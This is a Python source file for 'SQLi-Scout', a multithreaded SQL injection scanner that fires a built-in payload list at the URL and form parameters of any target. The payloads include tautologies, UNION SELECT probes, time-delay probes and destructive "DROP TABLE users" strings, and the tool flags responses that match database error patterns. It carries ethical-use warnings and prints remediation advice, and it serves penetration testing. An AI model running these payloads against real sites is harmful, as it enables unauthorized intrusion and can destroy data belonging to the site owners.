#!/usr/bin/env python3
"""
SQLi-Scout: A Cross-Platform SQL Injection Testing Tool
"""

import argparse
import requests
import sys
import re
import urllib.parse
import concurrent.futures
import time
import os
import platform

# Handle colorama import and initialization for cross-platform color support
try:
    from colorama import Fore, Style, init
    # Auto-reset is important for Windows compatibility
    init(autoreset=True)
    color_support = True
except ImportError:
    # Fallback if colorama isn't installed
    class DummyColor:
        def __getattr__(self, name):
            return ""
    
    Fore = Style = DummyColor()
    color_support = False

class SQLiScout:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers = {
            "User-Agent": "SQLi-Scout/1.1 (Cross-Platform Security Testing Tool)"
        }
        self.vulnerable_params = []
        self.tested_params = set()
        self.total_requests = 0
        self.error_patterns = [
            r"SQL syntax.*?error",
            r"Warning.*?mysql_",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"ORA-[0-9]{5}",
            r"Microsoft SQL Server error",
            r"ODBC SQL Server Driver",
            r"SQLite3::query",
            r"PostgreSQL.*?ERROR",
            r"Driver.*? SQL[\-\_\ ]*Server",
            r"DB2 SQL error",
            r"Informix",
            r"PLS-[0-9]+",
            r"Unclosed quotation mark",
            r"Syntax error in string in query expression"
        ]
        # Default payloads that will be used if no external file is provided
        self.injectable_payloads = [
            "'",
            "\"",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1\" --",
            "1; SELECT 1",
            "1'); DROP TABLE users--",
            "1\"); DROP TABLE users--",
            "' UNION SELECT 1,2,3,4,5--",
            "' AND 1=0 UNION SELECT 1,2,3,4,5--",
            "' AND 1=1 --",
            "' AND 1=0 --",
            "' OR 'x'='x",
            "' AND 'x'='y",
            "'; WAITFOR DELAY '0:0:5' --"
        ]
        
    def parse_args(self):
        parser = argparse.ArgumentParser(description="SQLi-Scout: A Cross-Platform SQL Injection Testing Tool")
        parser.add_argument("-u", "--url", required=True, help="Target URL to test")
        parser.add_argument("-p", "--parameter", help="Specific parameter to test")
        parser.add_argument("-c", "--cookie", help="Cookies to include with requests")
        parser.add_argument("-d", "--data", help="POST data to send")
        parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads")
        parser.add_argument("--form", action="store_true", help="Test form parameters")
        parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
        parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
        parser.add_argument("--payload-file", help="Path to file containing custom SQL injection payloads")
        parser.add_argument("--error-pattern-file", help="Path to file containing custom error patterns")
        parser.add_argument("-o", "--output", help="Save results to output file")
        parser.add_argument("--no-color", action="store_true", help="Disable colored output")
        return parser.parse_args()
    
    def print_banner(self):
        banner = f"""
{Fore.CYAN if color_support else ""}
  ____   ___  _     _       ____                 _   
 / ___| / _ \| |   (_)     / ___|  ___ ___  _   _| |_ 
 \___ \| | | | |   | |_____\___ \ / __/ _ \| | | | __|
  ___) | |_| | |___| |_____|__) | (_| (_) | |_| | |_ 
 |____/ \__\_\_____|_|     |____/ \___\___/ \__,_|\__|

 
                                                     
{Fore.GREEN if color_support else ""}[*] A Cross-Platform SQL Injection Testing Tool
{Fore.BLUE if color_support else ""}[*] For Security Testing and Educational Purposes Only
{Style.RESET_ALL if color_support else ""}
        """
        print(banner)
        
        # Print system information
        print(f"[*] Running on: {platform.system()} {platform.release()} ({platform.machine()})")
        print(f"[*] Python version: {platform.python_version()}")
        if not color_support:
            print("[!] Colorama not found. Install with: pip install colorama")
        print("")
    
    def load_payloads_from_file(self, file_path):
        """Load custom payloads from a file"""
        if not os.path.exists(file_path):
            print(f"{Fore.RED if color_support else ''}[!] Payload file not found: {file_path}")
            return False
            
        try:
            # Use universal newlines mode for cross-platform compatibility
            with open(file_path, 'r', newline=None) as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
            if not payloads:
                print(f"{Fore.YELLOW if color_support else ''}[!] No payloads found in file: {file_path}")
                return False
                
            print(f"{Fore.GREEN if color_support else ''}[+] Loaded {len(payloads)} payloads from {file_path}")
            self.injectable_payloads = payloads
            return True
            
        except Exception as e:
            print(f"{Fore.RED if color_support else ''}[!] Error loading payload file: {e}")
            return False
    
    def load_error_patterns_from_file(self, file_path):
        """Load custom error patterns from a file"""
        if not os.path.exists(file_path):
            print(f"{Fore.RED if color_support else ''}[!] Error pattern file not found: {file_path}")
            return False
            
        try:
            # Use universal newlines mode for cross-platform compatibility
            with open(file_path, 'r', newline=None) as f:
                patterns = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
            if not patterns:
                print(f"{Fore.YELLOW if color_support else ''}[!] No error patterns found in file: {file_path}")
                return False
                
            print(f"{Fore.GREEN if color_support else ''}[+] Loaded {len(patterns)} error patterns from {file_path}")
            self.error_patterns = patterns
            return True
            
        except Exception as e:
            print(f"{Fore.RED if color_support else ''}[!] Error loading error pattern file: {e}")
            return False
    
    def setup_session(self, args):
        global color_support
        if args.no_color:
            color_support = False
            
        if args.cookie:
            self.session.headers["Cookie"] = args.cookie
            
        # Load custom payloads if file provided
        if args.payload_file:
            self.load_payloads_from_file(args.payload_file)
            
        # Load custom error patterns if file provided
        if args.error_pattern_file:
            self.load_error_patterns_from_file(args.error_pattern_file)

        # Set appropriate timeout
        self.timeout = args.timeout
        
    def detect_forms(self, url):
        print(f"{Fore.YELLOW if color_support else ''}[*] Detecting forms on {url}...")
        try:
            response = self.session.get(url, timeout=self.timeout)
            self.total_requests += 1
            
            # Very simple form detection
            forms = re.findall(r'<form.*?action=["\']?(.*?)["\']?[\s>]', response.text, re.IGNORECASE)
            inputs = re.findall(r'<input.*?name=["\']?(.*?)["\']?[\s>]', response.text, re.IGNORECASE)
            
            if forms:
                print(f"{Fore.GREEN if color_support else ''}[+] Detected {len(forms)} form(s) with {len(inputs)} input field(s)")
                return forms, inputs
            else:
                print(f"{Fore.YELLOW if color_support else ''}[!] No forms detected")
                return [], []
                
        except Exception as e:
            print(f"{Fore.RED if color_support else ''}[!] Error detecting forms: {e}")
            return [], []
    
    def extract_params(self, url):
        # Extract parameters from URL
        if '?' not in url:
            return {}
        
        query_string = url.split('?', 1)[1]
        params = {}
        
        for param in query_string.split('&'):
            if '=' in param:
                name, value = param.split('=', 1)
                params[name] = value
        
        return params
    
    def is_vulnerable(self, response, payload):
        # Check for SQL errors in response
        for pattern in self.error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        # Check for time-based vulnerability
        if "WAITFOR DELAY" in payload and response.elapsed.total_seconds() > 4:
            return True
            
        return False
    
    def test_parameter(self, url, param, payload, method="GET", data=None, verbose=False):
        param_key = f"{url}:{param}:{method}"
        if param_key in self.tested_params:
            return
            
        self.tested_params.add(param_key)
        
        try:
            if method == "GET":
                # Parse the URL (handle cross-platform URL encoding issues)
                parsed_url = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed_url.query)
                
                # Modify the parameter
                query_params[param] = [payload]
                
                # Rebuild the query string
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                
                # Reconstruct the URL
                test_url = urllib.parse.urlunparse(
                    (parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                     parsed_url.params, new_query, parsed_url.fragment)
                )
                
                if verbose:
                    print(f"{Fore.BLUE if color_support else ''}[*] Testing: {test_url}")
                
                # Send the request
                response = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
            else:  # POST
                test_data = data.copy() if data else {}
                test_data[param] = payload
                
                if verbose:
                    print(f"{Fore.BLUE if color_support else ''}[*] Testing POST {url} - Parameter: {param} - Payload: {payload}")
                
                response = self.session.post(url, data=test_data, timeout=self.timeout, allow_redirects=False)
                
            self.total_requests += 1
            
            if self.is_vulnerable(response, payload):
                self.vulnerable_params.append({
                    "url": url,
                    "parameter": param,
                    "method": method,
                    "payload": payload,
                    "status_code": response.status_code
                })
                print(f"{Fore.RED if color_support else ''}[VULNERABLE] {method} {url} - Parameter: {param} - Payload: {payload}")
                return True
            elif verbose:
                print(f"{Fore.GREEN if color_support else ''}[SAFE] {method} {url} - Parameter: {param} - Payload: {payload}")
                
        except requests.exceptions.Timeout:
            if verbose:
                print(f"{Fore.YELLOW if color_support else ''}[!] Timeout testing {param} with {payload}")
        except requests.exceptions.ConnectionError:
            print(f"{Fore.YELLOW if color_support else ''}[!] Connection error testing {param} with {payload}")
        except Exception as e:
            print(f"{Fore.YELLOW if color_support else ''}[!] Error testing {param} with {payload}: {e}")
            
        return False
    
    def save_results(self, output_file):
        """Save scan results to output file"""
        try:
            # Use 'w' mode with newline='' for consistent line endings across platforms
            with open(output_file, 'w', newline='') as f:
                f.write("SQLi-Scout Scan Results\n")
                f.write("=======================\n\n")
                
                f.write(f"Total requests: {self.total_requests}\n")
                f.write(f"Total vulnerable parameters: {len(self.vulnerable_params)}\n\n")
                f.write(f"System: {platform.system()} {platform.release()} ({platform.machine()})\n\n")
                
                if self.vulnerable_params:
                    f.write("Vulnerable Parameters:\n")
                    f.write("---------------------\n")
                    
                    for vuln in self.vulnerable_params:
                        f.write(f"URL: {vuln['url']}\n")
                        f.write(f"Method: {vuln['method']}\n")
                        f.write(f"Parameter: {vuln['parameter']}\n")
                        f.write(f"Payload: {vuln['payload']}\n")
                        f.write(f"Status Code: {vuln['status_code']}\n")
                        f.write("\n")
                    
                    f.write("\nRecommendations:\n")
                    f.write("---------------\n")
                    f.write("1. Implement prepared statements or parameterized queries\n")
                    f.write("2. Apply input validation and sanitization\n")
                    f.write("3. Use an ORM (Object-Relational Mapping) library\n")
                    f.write("4. Apply the principle of least privilege to database users\n")
                else:
                    f.write("No SQL injection vulnerabilities detected.\n")
                    
            print(f"{Fore.GREEN if color_support else ''}[+] Results saved to {output_file}")
            
        except Exception as e:
            print(f"{Fore.RED if color_support else ''}[!] Error saving results: {e}")
    
    def scan_url(self, args):
        url = args.url
        print(f"{Fore.BLUE if color_support else ''}[*] Starting scan on {url}")
        print(f"{Fore.BLUE if color_support else ''}[*] Using {len(self.injectable_payloads)} payloads for testing")
        start_time = time.time()
        
        # Extract parameters from URL if it's a GET request
        params = self.extract_params(url)
        
        if args.parameter:
            params = {args.parameter: ""}
            
        if args.form:
            forms, inputs = self.detect_forms(url)
            if inputs:
                for input_field in inputs:
                    params[input_field] = ""
        
        if not params:
            print(f"{Fore.YELLOW if color_support else ''}[!] No parameters detected. Add parameters to test or use --form to detect forms.")
            return
            
        print(f"{Fore.BLUE if color_support else ''}[*] Testing {len(params)} parameters with {len(self.injectable_payloads)} payloads")
        
        # Determine optimal thread count based on system
        thread_count = args.threads
        if platform.system() == 'Darwin' and 'arm' in platform.machine().lower():
            # Adjust for Mac ARM if user didn't specify
            if not hasattr(args, 'thread_specified'):
                thread_count = min(max(os.cpu_count() - 1, 1), thread_count)
                print(f"{Fore.BLUE if color_support else ''}[*] Optimizing for Mac ARM: using {thread_count} threads")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []
            
            for param in params:
                for payload in self.injectable_payloads:
                    if args.data:  # If POST data is provided
                        post_data = {}
                        try:
                            # Handle URL-encoded form data
                            post_data_str = args.data
                            for item in post_data_str.split('&'):
                                if '=' in item:
                                    k, v = item.split('=', 1)
                                    post_data[k] = v
                        except Exception:
                            print(f"{Fore.YELLOW if color_support else ''}[!] Error parsing POST data, using as-is")
                            post_data = {param: payload}
                            
                        futures.append(
                            executor.submit(self.test_parameter, url, param, payload, "POST", post_data, args.verbose)
                        )
                    else:  # GET request
                        futures.append(
                            executor.submit(self.test_parameter, url, param, payload, "GET", None, args.verbose)
                        )
            
            # Process results as they complete
            completed = 0
            total = len(futures)
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                    completed += 1
                    if completed % 10 == 0 and not args.verbose:
                        progress = (completed / total) * 100
                        print(f"{Fore.BLUE if color_support else ''}[*] Progress: {progress:.1f}% ({completed}/{total})", end='\r')
                except Exception as e:
                    print(f"{Fore.RED if color_support else ''}[!] Error: {e}")
            
            print("\n")  # Clear the progress line
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n{Fore.BLUE if color_support else ''}[*] Scan completed in {duration:.2f} seconds")
        print(f"{Fore.BLUE if color_support else ''}[*] Total requests: {self.total_requests}")
        
        if self.vulnerable_params:
            print(f"\n{Fore.RED if color_support else ''}[!] Found {len(self.vulnerable_params)} vulnerable parameter(s):")
            for vuln in self.vulnerable_params:
                print(f"{Fore.RED if color_support else ''}  - {vuln['method']} {vuln['url']} - Parameter: {vuln['parameter']} - Payload: {vuln['payload']}")
                
            print(f"\n{Fore.YELLOW if color_support else ''}[*] Recommendations:")
            print(f"{Fore.YELLOW if color_support else ''}  - Implement prepared statements or parameterized queries")
            print(f"{Fore.YELLOW if color_support else ''}  - Apply input validation and sanitization")
            print(f"{Fore.YELLOW if color_support else ''}  - Use an ORM (Object-Relational Mapping) library")
            print(f"{Fore.YELLOW if color_support else ''}  - Apply the principle of least privilege to database users")
        else:
            print(f"\n{Fore.GREEN if color_support else ''}[+] No SQL injection vulnerabilities detected")
            
        if args.output:
            self.save_results(args.output)

    def run(self):
        self.print_banner()
        args = self.parse_args()
        self.setup_session(args)
        self.scan_url(args)


if __name__ == "__main__":
    print(f"{Fore.YELLOW if color_support else ''}[!] This tool is for ethical security testing only. Use responsibly and with permission.")
    print(f"{Fore.YELLOW if color_support else ''}[!] Improper use may be illegal and result in legal consequences.\n")
    
    try:
        scanner = SQLiScout()
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW if color_support else ''}[!] Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED if color_support else ''}[!] An error occurred: {e}")
        sys.exit(1)